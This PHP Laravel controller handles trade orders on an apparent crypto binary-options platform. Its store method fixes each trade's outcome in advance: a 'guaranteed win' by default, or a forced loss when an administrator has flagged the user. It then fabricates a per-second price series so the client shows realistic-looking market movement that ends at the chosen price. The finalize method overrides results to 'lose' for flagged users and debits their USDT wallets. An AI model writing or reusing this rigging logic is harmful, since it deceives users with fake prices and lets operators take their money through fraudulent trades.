<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\TradeOrder;
use App\Services\TradeService;
use App\Services\PriceService;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\DB;
use App\Models\UserWallet;
use App\Models\User;

class TradeOrderController extends Controller
{
    protected $tradeService;

    public function __construct(TradeService $tradeService)
    {
        $this->tradeService = $tradeService;
    }

    public function store(Request $r)
    {
        $data = $r->validate([
            'symbol' => 'required|string',
            'direction' => 'required|in:up,down',
            'delivery_seconds' => 'required|integer|min:1',
            'price_range_percent' => 'nullable|integer',
            'purchase_quantity' => 'required|numeric|min:1',
            'purchase_price' => 'required|numeric|min:0'
        ]);

        // Prevent near-duplicate orders: if the same user created a pending order with
        // the same parameters in the last 15 seconds, return that order instead of
        // creating a new one. This avoids accidental double-clicks or duplicate
        // submissions from the client.
        $userId = Auth::id();
        $recentWindow = now()->subSeconds(15);
        $existing = TradeOrder::where('user_id', $userId)
            ->where('symbol', strtoupper($data['symbol']))
            ->where('direction', $data['direction'])
            ->where('purchase_quantity', $data['purchase_quantity'])
            ->where('purchase_price', $data['purchase_price'])
            ->where('delivery_seconds', $data['delivery_seconds'])
            ->where('result', 'pending')
            ->where('created_at', '>=', $recentWindow)
            ->first();

        if ($existing) {
            // If a prepared price_list exists in meta, include it in the response so
            // the client can immediately use it; otherwise client will fall back to
            // live updates.
            $meta = (array) $existing->meta;
            $price_list = $meta['prepared_price_list'] ?? null;
            $force_result = $meta['force_result'] ?? null;
            return response()->json(['id' => $existing->id, 'initial_price' => $existing->initial_price ?? null, 'price_list' => $price_list, 'force_result' => $force_result]);
        }

        $order = TradeOrder::create([
            'user_id' => Auth::id(),
            'symbol' => strtoupper($data['symbol']),
            'direction' => $data['direction'],
            'purchase_quantity' => $data['purchase_quantity'],
            'purchase_price' => $data['purchase_price'],
            'price_range_percent' => $data['price_range_percent'] ?? null,
            'delivery_seconds' => $data['delivery_seconds'],
            'result' => 'pending'
        ]);

        // Fetch a server-authoritative current price and persist it as initial_price using PriceService
        $symbol = strtoupper($order->symbol);
        $initialPrice = PriceService::getCryptoPrice($symbol);

        if ($initialPrice !== null) {
            $order->initial_price = $initialPrice;
            // Always use the server-authoritative price as the purchase price to avoid
            // client-side stale/random values. This ensures the prepared price_list is
            // generated around a correct starting point.
            $order->purchase_price = $initialPrice;
            $order->save();
        }

        // Prepare a deterministic price_list for the client overlay so the UI can
        // simulate per-second price movement that naturally arrives at the final price.
        // By default the system prefers to produce a winning final price (unless the
        // user/account is marked for forced loss via admin settings).
        $user = User::find($order->user_id);
        $direction = $order->direction;
        $purchasePrice = (float)$order->purchase_price;
        $delivery = (int)$order->delivery_seconds;

        // Decide final price using trade service without persisting result yet
        if ($user && !empty($user->force_loss)) {
            $prepared = $this->tradeService->calculateForcedLoss([
                'user_id' => $user->id,
                'symbol' => $order->symbol,
                'direction' => $direction,
                'purchase_price' => $purchasePrice,
                'purchase_quantity' => $order->purchase_quantity,
                'price_range_percent' => $order->price_range_percent
            ], $initialPrice ?? $purchasePrice);
            $finalPrice = (float)($prepared['final_price'] ?? $purchasePrice);
            $force_result = 'lose';
        } else {
            $prepared = $this->tradeService->calculateAmountBasedGuaranteedWin([
                'user_id' => $user->id ?? null,
                'symbol' => $order->symbol,
                'direction' => $direction,
                'purchase_price' => $purchasePrice,
                'purchase_quantity' => $order->purchase_quantity,
                'price_range_percent' => $order->price_range_percent
            ], $initialPrice ?? $purchasePrice);
            $finalPrice = (float)($prepared['final_price'] ?? $purchasePrice);
            $force_result = 'win';
        }

        // Build a per-second price list by calling TradeService::calculateRealisticTradePrice
        $priceList = [];
        $seconds = max(1, $delivery);
        for ($s = 0; $s <= $seconds; $s++) {
            $progress = ($s / $seconds) * 100; // 0..100
            // TradeService::calculateRealisticTradePrice expects (purchasePrice, direction, progress, orderId)
            $p = $this->tradeService->calculateRealisticTradePrice($purchasePrice, $direction, $progress, (string)$order->id);
            $priceList[] = round($p, 8);
        }
        // Persist prepared final_price and price_list into order meta so finalize can use the same
        $meta = (array)$order->meta;
        $meta['prepared_price_list'] = $priceList;
        $meta['prepared_final_price'] = $finalPrice;
        $meta['prepared_at'] = now()->toDateTimeString();
        $order->meta = $meta;
        // store the intended final price (but keep result pending)
        $order->final_price = $finalPrice;
        $order->save();

        // Return id, initial price, prepared price_list and prepared final price so client
        // can display smooth, trusted animation that converges to the server-authoritative final price.
        return response()->json([
            'id' => $order->id,
            'initial_price' => $initialPrice,
            'price_list' => $priceList,
            'prepared_final_price' => $finalPrice,
            'force_result' => $force_result
        ]);
    }

    public function finalize(Request $r, $id)
    {
        $order = TradeOrder::findOrFail($id);
        if ($order->result !== 'pending') {
            return response()->json(['status' => 'already_finalized', 'result' => $order->result]);
        }

        // Prefer any server-prepared final_price stored on the order (prepared in store)
        $symbol = strtoupper($order->symbol);
        $finalPrice = null;
        if (!empty($order->final_price)) {
            $finalPrice = (float)$order->final_price;
        } else {
            // fetch final price for crypto from PriceService (single BCF-backed source)
            $finalPrice = PriceService::getCryptoPrice($symbol);
            if ($finalPrice === null) {
                if (!empty($order->initial_price)) {
                    $finalPrice = (float)$order->initial_price;
                } else {
                    $order->result = 'error';
                    $order->meta = array_merge((array)$order->meta, ['finalize_error' => 'fetch_failed']);
                    $order->save();
                    return response()->json(['status'=>'error','message'=>'final price fetch failed'], 500);
                }
            }
        }

        // Build a lightweight order array to compute the result deterministically
        $tradeArray = [
            'user_id' => $order->user_id,
            'symbol' => $order->symbol,
            'direction' => $order->direction,
            'purchase_price' => (float)$order->purchase_price,
            'purchase_quantity' => (float)$order->purchase_quantity,
            'price_range_percent' => $order->price_range_percent
        ];

        // Use calculateTradeResult which deterministically computes win/lose and profit
        $result = $this->tradeService->calculateTradeResult($tradeArray, $finalPrice);

        // If this user or order is marked for forced loss, ensure result is 'lose'
        $user = User::find($order->user_id);
        $meta = (array) ($order->meta ?? []);
        $isForcedLoss = false;
        if ($user && !empty($user->force_loss)) $isForcedLoss = true;
        if (!empty($meta['force_loss']) || !empty($meta['admin_forced_loss']) || (!empty($meta['force_result']) && $meta['force_result'] === 'lose')) $isForcedLoss = true;

        if ($isForcedLoss) {
            $result['result'] = 'lose';
            // adjust profit/payout for loss
            $result['profit_amount'] = -1.0 * $tradeArray['purchase_quantity'];
            $result['payout'] = 0;
            // annotate meta
            $order->meta = array_merge($meta, ['admin_forced_loss' => true, 'admin_forced_loss_applied_at' => now()->toDateTimeString()]);
        }

        // Update the order with calculated values
        // Only persist allowed keys to avoid accidental mass-assignment of unexpected fields
        $allowed = ['result', 'final_price', 'profit_amount', 'payout'];
        foreach ($allowed as $k) {
            if (array_key_exists($k, $result)) {
                $order->{$k} = $result[$k];
            }
        }
        // Ensure result is set to either 'win' or 'lose'
        if (!in_array($order->result, ['win','lose','error','pending'])) {
            $order->result = 'error';
        }
        $order->save();

        // --- Update user's USDT wallet based on profit_amount ---
        try {
            DB::beginTransaction();
            $userId = $order->user_id;
            $profit = floatval($order->profit_amount ?? 0);

            // Only do wallet updates when there's a non-zero profit (positive or negative)
            if ($profit != 0) {
                // Find user's USDT wallet; coin column may be stored lowercase
                $wallet = UserWallet::where('user_id', $userId)
                    ->whereRaw('LOWER(coin) = ?', ['usdt'])
                    ->first();

                if (!$wallet) {
                    // Create wallet if missing
                    $wallet = UserWallet::create([
                        'user_id' => $userId,
                        'coin' => 'USDT',
                        'balance' => 0,
                    ]);
                }

                $prev = floatval($wallet->balance ?? 0);
                $new = $prev + $profit; // profit may be negative for a loss
                $wallet->balance = $new;
                $wallet->save();

                // Annotate order meta for auditing
                $meta = (array) $order->meta;
                $meta['wallet_update'] = [
                    'coin' => 'USDT',
                    'previous_balance' => $prev,
                    'applied_amount' => $profit,
                    'new_balance' => $new,
                    'timestamp' => now()->toDateTimeString()
                ];
                $order->meta = $meta;
                $order->save();
            }

            DB::commit();
        } catch (\Exception $e) {
            DB::rollBack();
            // record the error in order meta but do not fail the finalize call
            $order->meta = array_merge((array)$order->meta, ['wallet_update_error' => $e->getMessage()]);
            $order->save();
        }

        return response()->json([
            'status' => 'ok',
            'result' => $order->result,
            'final_price' => $order->final_price,
            'profit_amount' => $order->profit_amount,
            'payout' => $order->payout
        ]);
    }
}
